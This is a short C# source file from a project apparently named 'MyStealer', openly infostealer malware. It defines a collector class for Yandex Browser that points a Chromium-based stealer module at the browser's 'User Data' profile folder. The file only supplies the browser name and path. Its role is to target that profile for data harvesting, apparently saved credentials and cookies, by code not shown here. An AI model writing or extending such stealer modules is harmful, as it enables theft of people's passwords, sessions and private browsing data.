using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class YandexBrowser : Chromium
    {
        public override string Name => "Yandex Browser";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex", "YandexBrowser", "User Data");
    }
}
